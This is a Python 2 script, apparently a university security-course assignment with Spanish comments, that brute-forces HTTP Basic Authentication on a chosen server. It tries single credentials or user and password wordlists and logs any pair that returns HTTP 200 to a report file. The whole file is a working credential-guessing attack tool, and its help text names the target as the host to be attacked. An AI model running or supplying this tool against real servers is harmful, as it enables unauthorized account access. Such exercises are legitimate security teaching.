#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-Becarios

#Leal Gonzalez Ignacio Tarea 5 Validar usuarios y passwords dados un archivo con usuarios, passwords o con ingresar un usuario y un password

# Importamos bibliotecas para el uso de excepciones y para la entrada de archivos
import sys
import optparse
from requests import get
from requests.exceptions import ConnectionError

# Cadenas de texto
texto1 = 'Credenciales encontradas: '
texto2 = "No funciono :c"
texto3 = 'Error en la conexion, tal vez el servidor no esta arriba.'


# Funcion para imprimir un error
def printError(msg, exit = False):

        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)


# Distintas banderas que utilizara nuestro programa
def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-U', '--user', dest='user', default=None, help='Usuario')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password')
    parser.add_option('-f', '--userFile', dest='userFile', default=None, help='Archivo con usuarios')
    parser.add_option('-F', '--passwordFile', dest='passwordFile', default=None, help='Archivo con passwords')
    parser.add_option('-r', '--reporte', dest='reporte', default=None, help='Archivo donde se escribiran los hallazgos')
    parser.add_option('-v', '--verboso', help='Muestra los pasos que se van realizando')
    opts,args = parser.parse_args()
    return opts


# Cuando no se especifican bien las banderas
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
    if options.user is None and options.userFile is None:
        printError('Debes especificar un usuario o un archivo con usuarios.', True)
    if options.password is None and options.passwordFile is None:
        printError('Debes especificar un password o un archivo con passwords.', True)
    if options.reporte is None:
        printError('Debes especificar un archivo donde se escribiran los hallazgos.', True)


# Funcion donde escribiremos los hallazgos encontrados
def reportResults(archivo, texto):
    with open(archivo,'a') as escritura:
        escritura.write('%s\n' % texto)


# Direccion ip del servidor al cual vamos atacar la convierte en formato de URL
def buildURL(server,port, protocol = 'http'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url


# Formamos el paquete con un usuario y un password para encontrar las credenciales
def makeRequest(host, user, password, verboso = 'False'):
    '''
    Pasamos cuatro parametros la url del servidor, el usuario, el password y la bandera que nos indicara si esta en modo verboso o no, este parametro es opcional, si
    tenemos una condicion de si esta activado el modo verboso describiremos lo que se esta haciendo en caso contrario no lo describiremos, pasamos el host, el
    usuario y el password, con las cuales nos autenticaremos en el servidor destino si nos autenticamos correctamente obtendremos un codigo 200 y regresaremos una
    cadena el texto1, el usuario y el password con el cual entramos en caso contrario devolveremos una cadena con el texto2, el usuario y el password con los cuales
    no pudimos autenticarnos, en caso que el servidor no este disponible nos mostrara el texto3 y regresaremos el texto3.
    '''
    if verboso != 'False':
        try:
            print "Obtiene el usuario y el password, las cuales usaremos para identificarnos en el servidor"
            response = get(host, auth=(user,password))
            if response.status_code == 200:
                print "Obtuvimos las credenciales correctas"
                print texto1, user, "\t", password
                text = texto1 + user + "\t" + password
                return text
            else:
                print "No obtuvimos las credenciales correctas"
                print texto2
                text2 = texto2 + user + "\t" + password
                return text2
        except ConnectionError:
            print "El servidor no esta disponible"
            printError(texto3,True)
            return (texto3)
    else:
        try:
            response = get(host, auth=(user,password))
            if response.status_code == 200:
                print texto1, user, "\t", password
                text = texto1 + user + "\t" + password
                return text
            else:
                print texto2
                text2 = texto2 + user + "\t" + password
                return text2
        except ConnectionError:
            printError(texto3,True)
            return texto3


# archivo usuarios y password
def makeRequest2(host, user, password, verboso = 'False'):
    '''
    Pasamos cuatro parametros la url del servidor, el archivo con usuarios, el password y la bandera que nos indicara si esta en modo verboso o no, este parametro es
    opcional, si tenemos una condicion de si esta activado el modo verboso describiremos lo que se esta haciendo en caso contrario no lo describiremos, abrimos el
    archivo de los usuarios y los guardamos en una lista, ahora haremos un ciclo for para que seleccione un solo usuario el cual con el password que pasamos como
    parametro trataremos de autenticarnos con esas credenciales, esto se hara con todos los usuarios, si nos autenticamos correctamente obtendremos un codigo 200 y
    regresaremos una cadena el texto1, el usuario y el password con el cual entramos en caso contrario devolveremos una cadena con el texto2, en caso que el servidor
    no este disponible nos mostrara el texto3 y regresaremos el texto3.
    '''
    if verboso != 'False':
        try:
            a = 0
            with open(user,'r') as usuario:
                usuarios = [linea.strip() for linea in usuario]
            print "Obtiene un usuario del archivo de usuarios y el password, las cuales usaremos para identificarnos en el servidor"
            for usua in usuarios:
                response = get(host, auth=(usua,password))
                if response.status_code == 200:
                    print "Obtuvimos las credenciales correctas"
                    print texto1, usua, "\t", password
                    text = texto1 + usua + "\t" + password
                    a = 1
                    break
            if a == 1:
                return text
            else:
                return texto2
        except ConnectionError:
            print "El servidor no esta disponible"
            printError(texto3,True)
            return (texto3)
    else:
        try:
            a = 0
            with open(user,'r') as usuario:
                usuarios = [linea.strip() for linea in usuario]
            for usua in usuarios:
                response = get(host, auth=(usua,password))
                if response.status_code == 200:
                    print texto1, usua, "\t", password
                    text = texto1 + usua + "\t" + password
                    a = 1
                    break
            if a == 1:
                return text
            else:
                return texto2
        except ConnectionError:
            printError(texto3,True)
            return texto3


# usuario y archivo password
def makeRequest3(host, user, password, verboso = 'False'):
    '''
    Pasamos cuatro parametros la url del servidor, un usuario, el archivo con passwords y la bandera que nos indicara si esta en modo verboso o no, este parametro
    es opcional, si tenemos una condicion de si esta activado el modo verboso describiremos lo que se esta haciendo en caso contrario no lo describiremos, abrimos el
    archivo de los passwords y los guardamos en una lista, ahora haremos un ciclo for para que seleccione un solo password el cual con el usuario que pasamos como
    parametro trataremos de autenticarnos con esas credenciales, esto se hara con todos los passwords, si nos autenticamos correctamente obtendremos un codigo 200 y
    regresaremos una cadena el texto1, el usuario y el password con el cual entramos en caso contrario devolveremos una cadena con el texto2, en caso que el servidor
    no este disponible nos mostrara el texto3 y regresaremos el texto3.
    '''
    if verboso != 'False':
        try:
            a = 0
            with open(password,'r') as passw:
                contra = [linea.strip() for linea in passw]
            print "Obtiene un password del archivo de passwords y el usuario, las cuales usaremos para identificarnos en el servidor"
            for pa in contra:
                response = get(host, auth=(user,pa))
                if response.status_code == 200:
                    print "Obtuvimos las credenciales correctas"
                    print texto1, user, "\t", pa
                    text = texto1 + user + "\t" + pa
                    a = 1
                    break
            if a == 1:
                return text
            else:
                return texto2
        except ConnectionError:
            print "El servidor no esta disponible"
            printError(texto3,True)
            return (texto3)
    else:
        try:
            a = 0
            with open(password,'r') as passw:
                contra = [linea.strip() for linea in passw]
            for pa in contra:
                response = get(host, auth=(user,pa))
                if response.status_code == 200:
                    print texto1, user, "\t", pa
                    text = texto1 + user + "\t" + pa
                    a = 1
                    break
            if a == 1:
                return text
            else:
                return texto2
        except ConnectionError:
            printError(texto3,True)
            return texto3


# archivo usuario y archivo password
def makeRequest4(host, user, password, verboso = 'False'):
    '''
    Pasamos cuatro parametros la url del servidor, un archivo con usuarios, el archivo con passwords y la bandera que nos indicara si esta en modo verboso o no, este
    parametro es opcional, si tenemos una condicion de si esta activado el modo verboso describiremos lo que se esta haciendo en caso contrario no lo describiremos,
    abrimos los archivos de los passwords, de los usuarios y los guardamos en una lista cada uno, ahora haremos dos ciclos for para que seleccione un solo password
    y verifique con todos los usuarios si obtenemos las credenciales correctas, esto se hara con todos los passwords y usuarios, si nos autenticamos correctamente
    obtendremos un codigo 200 y regresaremos una cadena el texto1, el usuario y el password con el cual entramos en caso contrario devolveremos una cadena con el
    texto2, en caso que el servidor no este disponible nos mostrara el texto3 y regresaremos el texto3.
    '''
    if verboso != 'False':
        try:
            a = 0
            with open(user,'r') as usuario:
                usuarios = [linea.strip() for linea in usuario]
            with open(password,'r') as passw:
                contra = [linea.strip() for linea in passw]
            print "Obtiene un password del archivo de passwords y un usuario del archivo usuarios, las cuales usaremos para identificarnos en el servidor"
            for pa in contra:
                for usua in usuarios:
                    response = get(host, auth=(usua,pa))
                    if response.status_code == 200:
                        print "Obtuvimos las credenciales correctas"
                        print texto1, usua, "\t", pa
                        text = texto1 + usua + "\t" + pa
                        a = 1
                        break
            if a == 1:
                return text
            else:
                return texto2
        except ConnectionError:
            print "El servidor no esta disponible"
            printError(texto3,True)
            return (texto3)
    else:
        try:
            a = 0
            with open(user,'r') as usuario:
                usuarios = [linea.strip() for linea in usuario]
            with open(password,'r') as passw:
                contra = [linea.strip() for linea in passw]
            for pa in contra:
                for usua in usuarios:
                    response = get(host, auth=(usua,pa))
                    if response.status_code == 200:
                        print texto1, usua, "\t", pa
                        text = texto1 + usua + "\t" + pa
                        a = 1
                        break
            if a == 1:
                print text
                return text
            else:
                return texto2
        except ConnectionError:
            printError(texto3,True)
            return texto3


# Funcion principal similar a main en c
if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port = opts.port)
        #Modo verboso
        if opts.verboso:
            # usuario y password
            if opts.user and opts.password:
                cadena = makeRequest(url, opts.user, opts.password, opts.verboso)
                print "Escribimos los hallazgos"
                reportResults(opts.reporte, cadena)
            # archivo de usuarios y password
            elif opts.userFile and opts.password:
                cadena = makeRequest2(url, opts.userFile, opts.password, opts.verboso)
                print "Escribimos los hallazgos"
                reportResults(opts.reporte, cadena)
            # usuario y archivo de passwords
            elif opts.user and opts.passwordFile:
                cadena = makeRequest3(url, opts.user, opts.passwordFile, opts.verboso)
                print "Escribimos los hallazgos"
                reportResults(opts.reporte, cadena)
            # archivo de usuarios y archivo de passwords
            elif opts.userFile and opts.passwordFile:
                cadena = makeRequest4(url, opts.userFile, opts.passwordFile, opts.verboso)
                print "Escribimos los hallazgos"
                reportResults(opts.reporte, cadena)
        #Sin modo verboso
        else:
            # usuario y password
            if opts.user and opts.password:
                cadena = makeRequest(url, opts.user, opts.password)
                reportResults(opts.reporte, cadena)
            # archivo de usuarios y password
            elif opts.userFile and opts.password:
                cadena = makeRequest2(url, opts.userFile, opts.password)
                reportResults(opts.reporte, cadena)
            # usuario y archivo de passwords
            elif opts.user and opts.passwordFile:
                cadena = makeRequest3(url, opts.user, opts.passwordFile)
                reportResults(opts.reporte, cadena)
            # archivo de usuarios y archivo de passwords
            elif opts.userFile and opts.passwordFile:
                cadena = makeRequest4(url, opts.userFile, opts.passwordFile)
                reportResults(opts.reporte, cadena)

    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
